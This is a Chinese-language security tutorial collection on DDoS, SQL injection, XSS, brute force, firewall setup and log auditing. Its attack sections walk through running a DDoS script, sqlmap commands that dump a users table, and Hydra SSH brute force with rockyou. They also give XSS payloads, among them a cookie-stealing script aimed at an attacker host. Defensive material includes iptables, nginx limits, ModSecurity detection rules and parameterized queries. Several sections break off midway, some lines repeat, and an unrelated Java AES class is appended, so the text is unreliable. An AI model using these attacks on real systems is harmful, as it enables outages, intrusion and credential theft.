DDoS攻击原理与防护（经典Termux/Kali实操，仅学习）

重要提示：发起DDoS攻击属于违法犯罪行为，本章节仅讲解DDoS攻击的原理和经典工具操作方法，目的是帮助大家掌握防护方法，严禁用于任何攻击行为。

一、DDoS攻击核心原理

DDoS（分布式拒绝服务）攻击是指攻击者控制大量傀儡机（肉鸡），向目标服务器发送海量的无效请求，耗尽服务器的带宽、CPU、内存等资源，导致合法用户无法访问服务器。核心分为三类：流量型攻击（耗尽带宽）、连接型攻击（耗尽连接数）、应用层攻击（耗尽应用资源）。

二、经典Termux DDoS工具实操（pembriahmad/DDOS）

该工具为入门级经典DDoS脚本，基于Python2开发，适用于Termux/Kali Linux，核心原理是发送海量TCP/UDP请求，以下为仅合法环境的实操步骤：

1. 环境准备（Zero Termux/Kali）

安装Python2、Python、Git基础依赖，终端逐行执行，注释：完成工具运行的基础软件包安装，-y表示自动确认安装：

# 安装python+python2解释器+git版本控制工具，适配Termux/Kali环境
pkg install python python2 git -y
# Kali Linux可替换为apt指令
apt install python python2 git -y

2. 克隆工具仓库

从Github拉取经典DDoS脚本，注释：将远程仓库源码克隆到本地终端环境：

# 克隆github上pembriahmad/DDOS经典脚本仓库
git clone https://github.com/pembriahmad/DDOS

3. 进入工具目录

切换到下载后的DDOS工具根目录，为运行脚本做准备，注释：cd为目录切换指令，进入工具工作目录：

# 进入DDOS工具根目录
cd DDOS

4. 运行DDoS核心脚本

调用Python2解释器运行ddos.py脚本，启动工具交互式界面，注释：该脚本仅支持Python2，不可用Python3运行：

# 运行经典DDoS攻击核心脚本，启动交互式配置界面
python2 ddos.py

5. 工具交互式配置（仅合法环境）

脚本运行后将出现以下交互提示，仅可输入自己拥有合法权限的目标IP/域名、端口，端口范围遵循TCP/IP协议规范（0~65535）：

# 第一步：输入目标IP/域名，示例：192.168.1.100（自身内网服务器）/localhost
[*] IP or HOSTNAME: 192.168.1.100
# 第二步：输入端口范围，示例：80-443（HTTP/HTTPS端口，仅测试自身开放端口）
[*] 端口扫描参数0~65535之间：80-443

6. 停止脚本运行

若需终止DDoS脚本的流量发送，终端按下组合键，注释：强制终止当前运行的Python进程，适用于所有Linux/Termux环境：

# 通用进程终止组合键，按下后立即停止脚本运行
CTRL + C

三、DDoS攻击针对性防护方案（核心重点）

学习DDoS工具的核心目的是掌握防护方法，以下为针对该经典脚本的多层防护方案，含Kali/Linux/服务器端实操指令，详细注释：

1. 网络层防护（iptables防火墙，Linux服务器）

通过iptables限制单IP连接数、请求频率，封禁恶意流量，注释：所有指令均在Linux防护服务器执行，逐行运行：

# 允许回环接口，保证服务器本地通信
iptables -A INPUT -i lo -j ACCEPT
# 允许已建立的连接，保证合法用户正常访问
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
# 限制单IP的SYN连接数（每秒最多10个），防御SYN洪水
iptables -A INPUT -p tcp --syn -m limit --limit 10/s --limit-burst 20 -j ACCEPT
iptables -A INPUT -p tcp --syn -j DROP
# 限制单IP的ICMP请求（每秒最多5个），防御ICMP洪水
iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 5/s --limit-burst 10 -j ACCEPT
iptables -A INPUT -p icmp --icmp-type echo-request -j DROP
# 限制单IP的TCP连接数最多5个，防止连接耗尽型DDoS
iptables -A INPUT -p tcp -m connlimit --connlimit-above 5 -j DROP
# 保存iptables规则（Debian/Ubuntu）
iptables-save > /etc/iptables/rules.v4
# 保存iptables规则（CentOS）
service iptables save

2. 应用层防护（Nginx限流，针对80/443端口）

编辑Nginx配置文件，添加请求限流规则，防止应用层CC攻击，注释：适用于所有搭建Nginx的Web服务器：

# 编辑Nginx主配置文件
vim /etc/nginx/nginx.conf
# 在http模块中添加限流规则，定义：每秒最多10个请求，缓冲区100个
limit_req_zone $binary_remote_addr zone=one:10m rate=10r/s;
# 在server模块中应用限流规则
server {
    listen 80;
    listen 443 ssl;
    server_name 192.168.1.100; # 自身服务器IP/域名
    # 对所有请求应用限流规则
    location / {
        limit_req zone=one burst=10 nodelay;
        root /usr/share/nginx/html;
        index index.html;
    }
}
# 重启Nginx使规则生效
systemctl restart nginx
# 验证Nginx配置是否正确
nginx -t

3. 应急防护措施

  • 及时联系服务商：开启高防IP/高防服务器，将流量引流到高防节点清洗恶意流量；
  • 暂停非核心服务：关闭暂时不需要的端口/服务，集中资源保障核心业务；
  • 日志分析：使用grep/awk分析Nginx/系统日志，定位攻击源IP，为封禁提供依据；
  • 上报公安机关：若DDoS攻击造成重大损失，及时向网络安全部门报警处理。

4. 生产环境终极防护方案

真实生产环境中，需配合多层防护体系：CDN（隐藏源IP）+ WAF（Web应用防火墙）+ 高防服务器 + 云防火墙，从源头拦截DDoS流量。

SQL注入原理与防护（Kali实操版）

重要提示：利用SQL注入攻击他人数据库属于违法行为，本章节仅讲解SQL注入的原理、Kali工具检测方法和防护方案，所有测试需在自己的合法环境中进行。

一、SQL注入核心原理

SQL注入是指攻击者在Web应用的输入参数中插入恶意的SQL语句，当应用程序未对输入进行过滤时，恶意SQL语句会被数据库执行，导致数据泄露、篡改甚至服务器被控制。核心原因是**直接拼接用户输入到SQL语句中，未做任何过滤验证**。

1. 经典脆弱代码示例（PHP）

注释：以下代码为存在SQL注入漏洞的典型写法，禁止在生产环境使用：

# 未过滤用户输入，直接通过GET获取id参数
$id = $_GET['id'];
# 直接拼接用户输入到SQL语句中，存在严重SQL注入漏洞
$sql = "SELECT * FROM users WHERE id = $id";
$result = mysqli_query($conn, $sql);

2. 经典注入利用示例

攻击者构造恶意请求，使SQL语句恒成立，查询出所有用户数据，注释：仅展示原理，严禁非法使用：

# 正常请求：http://192.168.1.100/user.php?id=1
# 恶意注入请求：拼接OR 1=1（恒成立）
http://192.168.1.100/user.php?id=1 OR 1=1
# 执行后的SQL语句：查询出users表中所有数据
SELECT * FROM users WHERE id = 1 OR 1=1;

二、Kali Linux检测SQL注入漏洞（SQLMap，仅合法环境）

SQLMap是Kali Linux自带的经典SQL注入检测工具，可自动化检测、利用SQL注入漏洞，以下为仅合法环境的实操步骤，详细注释：

1. 启动Kali Linux并验证SQLMap

# 打开Kali终端，验证SQLMap是否安装（Kali自带，无需额外安装）
sqlmap -h
# 查看SQLMap版本，确认工具可用
sqlmap --version

2. 基础检测指令（单URL检测）

检测指定URL是否存在SQL注入漏洞，注释：仅可输入自己合法开发的Web应用URL：

# 基础检测指令，-u指定目标URL，--batch表示自动确认所有选项
sqlmap -u "http://192.168.1.100/user.php?id=1" --batch
# 检测并列出数据库名，--dbs表示列出所有数据库
sqlmap -u "http://192.168.1.100/user.php?id=1" --dbs --batch
# 检测并列出指定数据库的表名，-D指定数据库名，--tables表示列出表
sqlmap -u "http://192.168.1.100/user.php?id=1" -D testdb --tables --batch
# 检测并列出指定表的字段，
# 检测并列出指定表的字段，-T指定表名，--columns表示列出字段
sqlmap -u "http://192.168.1.100/user.php?id=1" -D testdb -T users --columns --batch
# 导出指定表的所有数据，--dump表示导出数据
sqlmap -u "http://192.168.1.100/user.php?id=1" -D testdb -T users --dump --batch

3. 高级检测指令（POST请求/Cookie注入）

# 检测POST请求注入（--data指定POST参数）
sqlmap -u "http://192.168.1.100/login.php" --data "username=admin&password=123" --batch
# 检测Cookie注入（--cookie指定Cookie值）
sqlmap -u "http://192.168.1.100/index.php" --cookie "PHPSESSID=abc123; user_id=1" --batch
# 开启暴力破解表名/字段名（--brute）
sqlmap -u "http://192.168.1.100/user.php?id=1" --brute --batch

三、SQL注入全方位防护方案（实操版）

1. 核心防护：参数化查询（预编译语句）

从根本上杜绝SQL注入，将用户输入作为参数传递，而非直接拼接，以下为PHP/Java实操示例，带详细注释：

# PHP(PDO)参数化查询示例，支持所有数据库
$id = $_GET['id']; # 获取用户输入
# 初始化PDO连接数据库
$pdo = new PDO("mysql:host=localhost;dbname=testdb", "root", "123456");
# 预编译SQL语句，:id为参数占位符
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
# 绑定参数并指定类型（PDO::PARAM_INT表示整数）
$stmt->bindParam(':id', $id, PDO::PARAM_INT);
# 执行预编译语句
$stmt->execute();
# 获取查询结果
$result = $stmt->fetchAll(PDO::FETCH_ASSOC);

# Java(JDBC)参数化查询示例
String id = request.getParameter("id"); # 获取用户输入
String sql = "SELECT * FROM users WHERE id = ?"; # ?为参数占位符
# 预编译SQL语句
PreparedStatement pstmt = conn.prepareStatement(sql);
# 绑定参数（1表示第一个占位符，Integer.parseInt(id)转换为整数）
pstmt.setInt(1, Integer.parseInt(id));
# 执行查询
ResultSet rs = pstmt.executeQuery();

2. 辅助防护：输入过滤与验证

对用户输入进行严格过滤，仅允许合法字符/格式，PHP实操示例：

# 过滤数字以外的字符（适用于ID等数字参数）
$id = preg_replace('/[^0-9]/', '', $_GET['id']);
# 验证邮箱格式
$email = $_GET['email'];
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    die("非法邮箱格式，拒绝访问！");
}
# 过滤SQL特殊字符（单引号、分号、注释符等）
function filter_sql($str) {
    $special_chars = array("'", "\"", ";", "--", "/*", "*/");
    return str_replace($special_chars, "", $str);
}
$username = filter_sql($_POST['username']);

3. 权限防护：数据库最小权限原则

# 1. 创建仅拥有查询/插入/更新权限的数据库账号（MySQL）
CREATE USER 'web_user'@'localhost' IDENTIFIED BY 'Web@123456';
# 仅授予testdb数据库的users表查询/插入/更新权限
GRANT SELECT, INSERT, UPDATE ON testdb.users TO 'web_user'@'localhost';
# 禁止授予DROP/ALTER/DELETE等高危权限
FLUSH PRIVILEGES; # 刷新权限

# 2. 禁止使用root账号连接Web应用
# Web应用配置文件中使用web_user账号，而非root
$pdo = new PDO("mysql:host=localhost;dbname=testdb", "web_user", "Web@123456");

4. 设备防护：WAF拦截SQL注入

开源WAF（ModSecurity）配置示例，拦截SQL注入特征请求：

# 编辑ModSecurity配置文件（/etc/modsecurity/modsecurity.conf）
SecRuleEngine On # 开启规则引擎
SecRule REQUEST_URI|ARGS "union.*select|insert.*into|delete.*from|drop.*table" "id:10001,deny,status:403,msg:'SQL注入攻击被拦截 - 枫叶安全'"
SecRule REQUEST_URI|ARGS "or 1=1|and 1=1|sleep\(|benchmark\(" "id:10002,deny,status:403,msg:'SQL注入恶意函数被拦截 - 枫叶安全'"
# 重启Apache/Nginx使配置生效
systemctl restart apache2
systemctl restart nginx

XSS跨站脚本攻击原理与防护（Kali/Burp实操版）

重要提示：利用XSS攻击窃取用户Cookie、钓鱼、伪造操作等行为属于违法犯罪，本章节仅讲解XSS原理、Kali/Burp检测方法和防护方案，严禁用于非法用途。

一、XSS攻击核心原理与分类

XSS（跨站脚本）攻击是指攻击者在Web页面中注入恶意JavaScript代码，当用户访问该页面时，恶意代码会在用户浏览器中执行，从而窃取用户信息、伪造用户操作。核心原因是**应用未对用户输入进行过滤/编码，直接将输入输出到页面**。

1. XSS三大分类

  • 反射型XSS：恶意代码通过URL参数传递，仅对当前访问用户生效，如搜索框、留言板未过滤输入；
  • 存储型XSS：恶意代码被存储到数据库（如评论、文章、用户资料），所有访问该页面的用户都会执行，危害最大；
  • DOM型XSS：恶意代码通过修改页面DOM结构执行，不经过服务器，仅在浏览器端生效。

2. 经典反射型XSS示例

PHP脆弱代码（未过滤输入，直接输出）：

# 未过滤用户输入，直接通过GET获取name参数
$name = $_GET['name'];
# 直接将用户输入输出到页面，存在严重反射型XSS漏洞
echo "欢迎你，$name！";

攻击者构造恶意请求，注入JS代码：

# 正常请求：http://192.168.1.100/hello.php?name=枫叶安全
# 恶意XSS请求：注入弹窗代码
http://192.168.1.100/hello.php?name=<script>alert('XSS攻击-枫叶安全');</script>
# 注入窃取Cookie代码（非法用途，仅展示原理）
http://192.168.1.100/hello.php?name=<script>document.location='http://攻击者IP/steal.php?cookie='+document.cookie;</script>

二、Kali/Burp Suite检测XSS漏洞（仅合法环境）

1. Burp Suite基础抓包检测（最常用）

Burp Suite是Kali自带的Web漏洞检测工具，以下为XSS检测实操步骤，带详细注释：

  1. 启动Burp Suite：Kali终端输入burpsuite，选择默认配置启动；
  2. 配置代理：Proxy→Options，设置监听地址127.0.0.1:8080，勾选Running；
  3. 配置浏览器代理：将Kali浏览器代理指向127.0.0.1:8080；
  4. 安装Burp证书：访问http://burp/cert，下载并安装证书（解决HTTPS抓包）；
  5. 抓包检测：访问目标Web应用（自身合法应用），在输入框输入<script>alert(1)</script>，Burp捕获请求后，右键→Send to Scanner，自动检测XSS漏洞；
  6. 查看结果：Scanner→Results，查看是否存在XSS漏洞，高危漏洞会标注Cross-site scripting (reflected)。

2. Kali XSS检测工具（XSSer）实操

XSSer是Kali自带的XSS专用检测工具，自动化注入测试，指令示例带注释：

# 启动Kali终端，验证XSSer
xsser -h
# 基础检测反射型XSS（-u指定目标URL，-p指定参数）
xsser -u "http://192.168.1.100/hello.php" -p "name" --batch
# 检测存储型XSS（--post指定POST参数，-d指定数据）
xsser -u "http://192.168.1.100/comment.php" --post -d "content=test&submit=1" -p "content" --batch
# 开启强力检测模式（--powerful）
xsser -u "http://192.168.1.100/hello.php" -p "name" --powerful --batch

三、XSS全方位防护方案（实操版，核心）

1. 核心防护：输入过滤 + 输出编码

将用户输入的特殊字符转换为HTML实体，使浏览器无法解析为JS代码，PHP/JavaScript实操示例：

# PHP输出编码（最常用，htmlspecialchars转换所有特殊字符）
$name = $_GET['name'];
# ENT_QUOTES表示转换单引号和双引号，UTF-8指定编码
$name = htmlspecialchars($name, ENT_QUOTES, 'UTF-8');
# 过滤HTML标签（strip_tags，可选）

暴力破解原理与防护（Kali/Hydra实操版）

重要提示：对他人账号、服务器、数据库进行暴力破解属于违法行为，本章节仅讲解暴力破解原理、Kali工具检测方法和防护方案，所有测试需在自己的合法环境中进行。

一、暴力破解核心原理

暴力破解是指攻击者使用自动化工具，尝试大量的用户名/密码组合，直到匹配到正确的凭证，核心依赖**弱密码**和**无登录限制**。常见攻击目标：Web登录页面、SSH/RDP/FTP、数据库、API接口。

经典暴力破解工具：Kali自带Hydra（九头蛇）、Burp Suite、Medusa、Ncrack，其中Hydra最常用，支持多种协议破解。

二、Kali Hydra暴力破解实操（仅合法环境）

Hydra是Kali自带的万能暴力破解工具，支持SSH/FTP/HTTP/MySQL等数十种协议，以下为实操指令，带详细注释，仅可测试自身合法设备/服务器：

1. Hydra基础指令（查看帮助）

hydra -h
# 查看指定协议的破解参数（如ssh）

# 查看HTTP表单破解参数
hydra -U http-form-post

2. 破解SSH服务（最常用，Linux服务器）

# 破解SSH（-l指定单个用户名，-P指定密码字典，-t指定线程数，-vV显示详细过程，-o保存结果）
hydra -l root -P /usr/share/wordlists/rockyou.txt -t 10 -vV -o ssh_brute.txt ssh://192.168.1.100:22
# 解释：
# /usr/share/wordlists/rockyou.txt：Kali自带密码字典，需解压（gunzip /usr/share/wordlists/rockyou.txt.gz）
# -t 10：10线程，避免线程过多被拦截
# ssh://192.168.1.100:22：目标SSH服务器IP+端口

# 破解多个用户名（-L指定用户名字典）
hydra -L user.txt -P pass.txt -t 5 -vV ssh://192.168.1.100:22

# 解释：
# /login.php：登录页面路径
# username=^USER^&password=^PASS^：POST参数，^USER^/^PASS^为Hydra占位符
# 用户名或密码错误：登录失败的提示信息（Hydra根据此判断是否破解成功）

4. 破解MySQL数据库

三、暴力破解全方位防护方案（实操版，核心）

1. 核心防护：限制登录尝试次数

对同一账号/IP的登录尝试次数进行限制，达到阈值后暂时封禁，PHP实操示例（Web登录）：

session_start(); # 初始化Session
# 初始化登录失败次数和封禁时间
if (!isset($_SESSION['login_attempts'])) {
    $_SESSION['login_attempts'] = 0;
    $_SESSION['block_time'] = 0;
}
# 检查是否处于封禁期（10分钟=600秒）
if (time() < $_SESSION['block_time']) {
    $left_time = $_SESSION['block_time'] - time();
    die("登录失败次数过多，请{$left_time}秒后再试！-枫叶安全");
}
# 验证用户名和密码
if ($_POST['username'] && $_POST['password']) {
    if (check_login($_POST['username'], $_POST['password'])) { # 自定义验证函数
        $_SESSION['login_attempts'] = 0; # 登录成功，重置失败次数
        header("Location: dashboard.php");
        exit;
    } else {
        $_SESSION['login_attempts']++; # 登录失败，增加次数
        # 失败5次，封禁10分钟
        if ($_SESSION['login_attempts'] >= 5) {
            $_SESSION['block_time'] = time() + 600;
            die("登录失败5次，账号封禁10分钟！-枫叶安全");
        }
        $left_attempts = 5 - $_SESSION['login_attempts'];
        die("用户名或密码错误，剩余尝试次数：{$left_attempts} -枫叶安全");
    }
}

2. 根本防护：强化密码策略（禁止弱密码）

强制用户设置强密码，PHP密码复杂度检测示例，同时服务器/数据库/SSH禁止使用弱密码：

# PHP密码复杂度检测函数（至少8位，含大小写字母、数字、特殊字符）
function check_password_strength($password) {
    if (strlen($password) < 8) return false; # 长度≥8
    if (!preg_match('/[A-Z]/', $password)) return false; # 含大写字母
    if (!preg_match('/[a-z]/', $password)) return false; # 含小写字母
    if (!preg_match('/[0-9]/', $password)) return false; # 含数字
    if (!preg_match('/[^a-zA-Z0-9]/', $password)) return false; # 含特殊字符
    return true;
}
# 使用示例
$password = $_POST['password'];
if (!check_password_strength($password)) {
    die("密码强度不足！要求：至少8位，含大小写字母、数字、特殊字符（!@#$%^&*）-枫叶安全");
}
# 服务器SSH禁止弱密码：修改/etc/ssh/sshd_config，添加PasswordAuthentication no（仅密钥登录）

双因素认证需要用户除了密码外，还需提供第二种验证方式（手机验证码、谷歌验证器、UKey），即使密码被破解，攻击者也无法登录，PHP谷歌验证器（TOTP）实操示例：

合法漏洞扫描（Kali全套工具实操，仅自身环境）

重要提示：未经授权扫描他人服务器/网站/设备的漏洞属于违法行为，所有扫描操作必须在自己拥有合法权限的设备/服务器/应用上进行，否则将承担相应法律责任。

一、漏洞扫描核心原则

  • 授权原则：仅扫描自己的资产，或获得书面授权的目标，无授权不扫描；
  • 最小影响原则：避免使用高风险扫描方式（如DoS测试），防止影响服务器正常运行；
  • 记录原则：详细记录扫描结果，包括漏洞类型、风险等级、修复建议；
  • 修复原则：发现漏洞后及时修复，并验证修复效果，形成闭环。

三、漏洞扫描结果分析与修复流程（核心）

  1. 漏洞分级：将扫描出的漏洞按风险等级分为高危、中危、低危、信息，优先修复高危漏洞（如远程代码执行、SQL注入、未授权访问）；
  2. 漏洞验证：对扫描出的漏洞进行手动验证，排除误报（扫描工具可能存在误报，需实际测试确认）；
  3. 制定修复方案：根据漏洞类型，制定针对性修复方案（如升级软件版本、配置防火墙、修改代码、强化权限）；
  4. 执行修复：在测试环境验证修复方案后，再部署到生产环境，避免修复导致业务中断；
  5. 重新扫描：修复完成后，使用相同的扫描工具重新扫描目标，确认漏洞已修复；
  6. 记录归档：将扫描报告、修复方案、验证结果归档，形成安全档案，便于后续追溯和审计。

防火墙配置教程（Linux，iptables/firewalld实操版）

核心价值：防火墙是Linux服务器的第一道安全防线，通过配置防火墙规则，可过滤非法网络流量、封禁恶意IP、限制端口访问，从网络层防护服务器安全。

一、iptables防火墙配置（Linux通用，最基础）

iptables是Linux系统自带的核心防火墙工具，基于包过滤技术，可配置入站/出站/转发规则，以下为实操指令，带详细注释，所有指令需在root权限下执行：

1. iptables基础命令（查看/清空/保存规则）

# 查看所有iptables规则（-L列出规则，-n数字格式显示，-v详细信息）
iptables -L -n -v
# 查看指定链的规则（如INPUT链，入站规则）
iptables -L INPUT -n -v
# 清空所有iptables规则（-F清空，-X删除自定义链）
iptables -F
iptables -X
# 重置默认策略（默认允许所有流量，可改为DROP）
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
# 保存iptables规则（Debian/Ubuntu）
iptables-save > /etc/iptables/rules.v4
# 保存iptables规则（CentOS 6及以下）
service iptables save
# 恢复iptables规则
iptables-restore < /etc/iptables/rules.v4
# 设置iptables开机自启（Debian/Ubuntu）
systemctl enable netfilter-persistent
# 设置iptables开机自启（CentOS 6及以下）
chkconfig iptables on

2. iptables常用规则配置（基础防护，必配）

# 1. 允许回环接口（lo），保证服务器本地通信，禁止则服务器无法正常运行
iptables -A INPUT -i lo -j ACCEPT
# 2. 允许已建立的连接和相关连接，保证合法用户正常访问
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
# 3. 允许SSH端口（22，若修改为2222则替换为2222）
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
# 4. 允许HTTP（80）和HTTPS（443）端口，Web服务器必配
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT
# 5. 允许Ping（ICMP）请求，可选，禁止则他人无法Ping通服务器
iptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPT
# 6. 拒绝所有其他入站流量（核心，只允许上述放行的流量）
iptables -P INPUT DROP
iptables -P FORWARD DROP
# 7. 允许所有出站流量，服务器可正常访问外部网络
iptables -P OUTPUT ACCEPT
# 保存规则，使配置永久生效
iptables-save > /etc/iptables/rules.v4

3. iptables高级规则配置（强化防护，推荐）

# 1. 限制单IP的SSH连接数（最多5个，防止SSH暴力破解）
iptables -A INPUT -p tcp --dport 22 -m connlimit --connlimit-above 5 -j DROP
# 2. 限制单IP的HTTP请求频率（每秒最多20个，防止CC攻击）
iptables -A INPUT -p tcp --dport 80 -m limit --limit 20/s --limit-burst 40 -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j DROP
# 3. 封禁特定恶意IP（单个IP）
iptables -A INPUT -s 192.168.1.xxx -j DROP
# 4. 封禁特定IP段（如192.168.1.0/24，/24表示子网掩码255.255.255.0）
iptables -A INPUT -s 192.168.1.0/24 -j DROP
# 5. 解封指定IP（删除对应的DROP规则，先查看规则编号：iptables -L INPUT -n --line-numbers）
ipt# 解封指定IP（删除对应的DROP规则，先查看规则编号：iptables -L INPUT -n --line-numbers）
iptables -D INPUT 8 # 8为规则编号，替换为实际编号
# 6. 记录DROP的流量到系统日志（便于分析攻击）
iptables -A INPUT -j LOG --log-prefix "IPTABLES_DROP: " --log-level 4
# 7. 限制单IP的ICMP请求频率（每秒最多5个，防止ICMP洪水攻击）
iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 5/s --limit-burst 10 -j ACCEPT
iptables -A INPUT -p icmp --icmp-type echo-request -j DROP
# 8. 禁止特定端口的出站流量（如禁止服务器访问外部22端口，防止被作为肉鸡）
iptables -A OUTPUT -p tcp --dport 22 -j DROP
# 9. 只允许特定IP访问MySQL端口（3306，数据库安全加固）
iptables -A INPUT -p tcp --dport 3306 -s 192.168.1.100 -j ACCEPT # 仅允许192.168.1.100访问
iptables -A INPUT -p tcp --dport 3306 -j DROP # 拒绝其他所有IP访问
# 保存高级规则
iptables-save > /etc/iptables/rules.v4

4. iptables规则备份与恢复（迁移/故障恢复）

# 备份当前iptables规则到文件
iptables-save > /root/iptables_backup_$(date +%Y%m%d).rules
# 从备份文件恢复规则
iptables-restore < /root/iptables_backup_20240520.rules
# 恢复后保存，确保永久生效
iptables-save > /etc/iptables/rules.v4

二、firewalld防火墙配置（CentOS 7+/RHEL 7+，新一代工具）

firewalld是CentOS 7及以上版本默认的防火墙管理工具，支持动态规则配置（无需重启服务）、区域管理，操作更简洁，以下为实操指令，带详细注释：

1. firewalld基础命令（启动/停止/状态）

# 启动firewalld服务
systemctl start firewalld
# 停止firewalld服务
systemctl stop firewalld
# 重启firewalld服务
systemctl restart firewalld
# 查看firewalld状态（running为运行中）
systemctl status firewalld
# 设置firewalld开机自启
systemctl enable firewalld
# 禁止firewalld开机自启
systemctl disable firewalld
# 查看firewalld已启用的区域（默认public区域）
firewall-cmd --get-active-zones
# 查看默认区域
firewall-cmd --get-default-zone
# 设置默认区域为public
firewall-cmd --set-default-zone=public

2. firewalld常用规则配置（基础防护）

# 1. 允许SSH服务（永久生效，--permanent表示永久规则，需reload生效）
firewall-cmd --add-service=ssh --permanent
# 2. 允许HTTP服务（80端口）
firewall-cmd --add-service=http --permanent
# 3. 允许HTTPS服务（443端口）
firewall-cmd --add-service=https --permanent
# 4. 开放自定义端口（如8080/tcp，Web应用常用）
firewall-cmd --add-port=8080/tcp --permanent
# 5. 开放端口范围（如1000-2000/tcp）
firewall-cmd --add-port=1000-2000/tcp --permanent
# 6. 允许Ping（ICMP请求）
firewall-cmd --add-icmp-block-inversion --permanent
firewall-cmd --add-icmp-type=echo-request --permanent
# 7. 重新加载规则，使永久规则生效
firewall-cmd --reload
# 8. 查看已配置的规则（永久规则）
firewall-cmd --list-all --permanent
# 9. 查看当前生效的规则（临时+永久）
firewall-cmd --list-all

3. firewalld高级规则配置（强化防护）

# 1. 封禁特定IP（永久生效）
firewall-cmd --add-rich-rule='rule family="ipv4" source address="192.168.1.xxx" reject' --permanent
# 2. 封禁IP段（如192.168.2.0/24）
firewall-cmd --add-rich-rule='rule family="ipv4" source address="192.168.2.0/24" reject' --permanent
# 3. 解封特定IP
firewall-cmd --remove-rich-rule='rule family="ipv4" source address="192.168.1.xxx" reject' --permanent
# 4. 只允许特定IP访问MySQL端口（3306）
firewall-cmd --add-rich-rule='rule family="ipv4" source address="192.168.1.100" port protocol="tcp" port="3306" accept' --permanent
firewall-cmd --add-rich-rule='rule family="ipv4" port protocol="tcp" port="3306" reject' --permanent
# 5. 限制单IP的连接数（如SSH端口最多5个连接）
firewall-cmd --add-rich-rule='rule family="ipv4" port protocol="tcp" port="22" limit value="5/m" accept' --permanent
firewall-cmd --add-rich-rule='rule family="ipv4" port protocol="tcp" port="22" reject' --permanent
# 6. 配置端口转发（如将80端口转发到8080端口）
firewall-cmd --add-forward-port=port=80:proto=tcp:to-port=8080 --permanent
# 7. 禁止出站特定端口（如禁止访问外部22端口）
firewall-cmd --add-rich-rule='rule family="ipv4" port protocol="tcp" port="22" outbound reject' --permanent
# 重新加载规则生效
firewall-cmd --reload

4. firewalld区域管理（多场景适配）

firewalld通过区域划分不同安全级别，常用区域：public（公共网络，默认）、internal（内部网络，信任度高）、dmz（非军事区，如服务器），配置示例：

# 1. 查看所有区域
firewall-cmd --get-zones
# 2. 为网卡分配区域（如eth0分配到dmz区域）
firewall-cmd --zone=dmz --add-interface=eth0 --permanent
# 3. 查看dmz区域的规则
firewall-cmd --zone=dmz --list-all --permanent
# 4. 为dmz区域开放HTTP/HTTPS服务
firewall-cmd --zone=dmz --add-service=http --permanent
firewall-cmd --zone=dmz --add-service=https --permanent
# 重新加载规则
firewall-cmd --reload

三、防火墙配置注意事项（避坑指南）

  • 配置前备份当前规则，避免误配置导致服务器无法访问（尤其是远程SSH连接时）；
  • 远程配置防火墙时，先确保SSH端口已放行，再设置默认策略为DROP，防止被踢下线；
  • firewalld和iptables不可同时启用，CentOS 7+推荐使用firewalld，兼容性更好；
  • 规则配置后务必保存（iptables-save/firewall-cmd --reload），否则重启服务/服务器后规则失效；
  • 定期审计防火墙规则，删除无用规则，避免规则过多导致性能下降或冲突；
  • 生产环境建议结合云防火墙（如阿里云/腾讯云云防火墙），实现多层防护。

日志审计教程（Linux/Windows，安全分析核心）

核心价值：日志是服务器安全的"黑匣子"，通过审计系统日志、应用日志，可追溯攻击行为、发现异常操作、定位安全事件根源，是安全应急响应和日常防护的关键环节。

一、Linux系统日志位置与类型（核心日志文件）

Linux系统日志集中存储在/var/log目录下，不同日志对应不同功能，以下为核心日志文件说明：

  • /var/log/auth.log（Debian/Ubuntu）//var/log/secure（CentOS/RHEL）：认证日志，记录SSH登录、sudo操作、用户认证等关键信息，暴力破解、非法登录等行为会在此留下痕迹；
  • /var/log/syslog（Debian/Ubuntu）：系统综合日志，记录内核、系统服务、应用程序的运行日志，涵盖范围最广；
  • /var/log/messages（CentOS/RHEL）：系统核心日志，类似syslog，记录系统关键事件；
  • /var/log/apache2/（Apache）//var/log/nginx/（Nginx）：Web服务器日志，包含access.log（访问日志）和error.log（错误日志），记录所有HTTP/HTTPS请求；
  • /var/log/mysql/：MySQL数据库日志，包含error.log（错误日志）、slow.log（慢查询日志）、general.log（通用查询日志）；
  • /var/log/cron：定时任务日志，记录crontab任务的执行情况，防止恶意定时任务（如挖矿程序）；
  • /var/log/boot.log：系统启动日志，记录服务器启动过程中的事件，可排查启动故障。

二、Linux日志分析工具实操（grep/awk/sed，基础必备）

通过命令行工具快速分析日志，定位关键信息，以下为高频实操指令，带详细注释：

1. grep（日志关键词搜索，最常用）

# 1. 搜索SSH登录失败记录（CentOS：/var/log/secure，Debian：/var/log/auth.log）
grep "Failed password" /var/log/auth.log
# 2. 搜索SSH登录成功记录
grep "Accepted password" /var/log/auth.log
# 3. 搜索特定IP的所有操作记录（如192.168.1.xxx）
grep "192.168.1.xxx" /var/log/auth.log
# 4. 搜索Web服务器的404错误（Nginx）
grep " 404 " /var/log/nginx/access.log
# 5. 搜索Web服务器的SQL注入特征请求（如union select）
grep -i "union.*select" /var/log/nginx/access.log
# 6. 统计SSH登录失败次数

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.util.Base64;
import java.security.SecureRandom;

public class AESUtil {
    // AES算法模式：AES-256-CBC
    private static final String ALGORITHM = "AES/CBC/PKCS5Padding";
    // 密钥长度（256位）
    private static final int KEY_LENGTH = 256;
    // IV长度（16位）
    private static final int IV_LENGTH = 16;

    /**
     * 生成AES密钥（256位）
     * @param keySeed 密钥种子（字符串）
     * @return 256位密钥
     */
    private static SecretKeySpec generateKey(String keySeed) {
        try {
            // 使用SHA-256哈希生成32位密钥（256位）
            byte[] keyBytes = keySeed.getBytes("UTF-8");
            java.security.MessageDigest md = java.security.MessageDigest.getInstance("SHA-256");
            keyBytes = md.digest(keyBytes);
            return new SecretKeySpec(keyBytes, "AES");
        } catch (Exception e) {
            throw new RuntimeException("生成AES密钥失败", e);
        }
    }

    /**
     * 生成随机IV（16位）
     * @return 随机IV
     */
